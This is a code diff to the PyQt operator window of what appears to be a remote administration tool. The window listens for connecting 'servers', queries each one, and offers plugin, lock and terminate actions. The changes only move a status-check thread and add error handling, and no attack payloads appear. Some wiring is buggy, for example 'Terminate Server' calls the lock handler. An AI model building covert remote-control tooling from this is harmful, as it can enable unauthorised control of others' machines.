@@ -76,8 +76,6 @@ class MainDialog(QMainWindow, main_ui.Ui_MainWindow):
         self.startListenButton.clicked.connect(self.startListen)
         self.stopListenButton.clicked.connect(self.stopListen)
 
-        self.clientSettingsButton.clicked.connect(self.runPlugin)
-
 
     # Start Listen for Servers
     def startListen(self):
@@ -110,6 +108,12 @@ class MainDialog(QMainWindow, main_ui.Ui_MainWindow):
 
         # Start listen for connections
         self.c.listen(128)
+
+        # Start Servers Check Thread
+        serversCheckThread = threading.Thread(target=self.checkServers)
+        serversCheckThread.setDaemon(True)
+        serversCheckThread.start()
+
         while self.acceptthreadState:
             try:
 
@@ -123,6 +127,7 @@ class MainDialog(QMainWindow, main_ui.Ui_MainWindow):
             if self.sock:
 
                 # TEST GET INFO
+
                 try:
                     mSend(self.sock, 'whoareyou')
                     data = mReceive(self.sock)
@@ -147,10 +152,6 @@ class MainDialog(QMainWindow, main_ui.Ui_MainWindow):
 
                     self.updateServersTable()
 
-                    # Start Servers Check Thread
-                    serversCheckThread = threading.Thread(target=self.checkServers)
-                    serversCheckThread.setDaemon(True)
-                    serversCheckThread.start()
                 except:
                     continue
 
@@ -287,24 +288,29 @@ class MainDialog(QMainWindow, main_ui.Ui_MainWindow):
             self.stopListenButton.setChecked(True)
 
     def serversMenu(self, point):
-        self.eMenu = QMenu(self)
-        self.optionsMenu = QMenu('Server Options' ,self)
 
-        if self.serversTable.item(self.serversTable.currentRow(), self.index_of_lock).text() == 'LOCKED':
-            self.eMenu.addAction(QIcon(os.path.join(self.assets, 'unlock.png')), 'Unlock Server', self.unlockServer)
+        try:
+            server_index = self.serversTable.currentRow()
+            self.eMenu = QMenu(self)
+            self.optionsMenu = QMenu('Server Options' ,self)
 
-        else:
+            if self.serversTable.item(server_index, self.index_of_lock).text() == 'LOCKED':
+                self.eMenu.addAction(QIcon(os.path.join(self.assets, 'unlock.png')), 'Unlock Server', self.unlockServer)
 
-            # add plugins to menu
-            for name, plugin in self.plugins.iteritems():
-                self.eMenu.addAction(QIcon(plugin['icon']), plugin['name'], lambda: self.runPlugin(plugin=name))
+            else:
+
+                # add plugins to menu
+                for name, plugin in self.plugins.iteritems():
+                    self.eMenu.addAction(QIcon(plugin['icon']), plugin['name'], lambda: self.runPlugin(plugin=name))
 
 
-            self.eMenu.addSeparator()
-            self.eMenu.addMenu(self.optionsMenu)
-            self.optionsMenu.addAction(QIcon(os.path.join(self.assets, 'lock_2.png')), 'Lock Server', self.lockServer)
-            self.optionsMenu.addAction(QIcon(os.path.join(self.assets, 'stop.png')), 'Terminate Server', self.lockServer)
-        self.eMenu.exec_(self.serversTable.mapToGlobal(point))
+                self.eMenu.addSeparator()
+                self.eMenu.addMenu(self.optionsMenu)
+                self.optionsMenu.addAction(QIcon(os.path.join(self.assets, 'lock_2.png')), 'Lock Server', self.lockServer)
+                self.optionsMenu.addAction(QIcon(os.path.join(self.assets, 'stop.png')), 'Terminate Server', self.lockServer)
+            self.eMenu.exec_(self.serversTable.mapToGlobal(point))
+        except AttributeError:
+            pass
 
     # id generator for new windows
     def id_generator(self, size=16, chars=string.ascii_uppercase + string.digits):
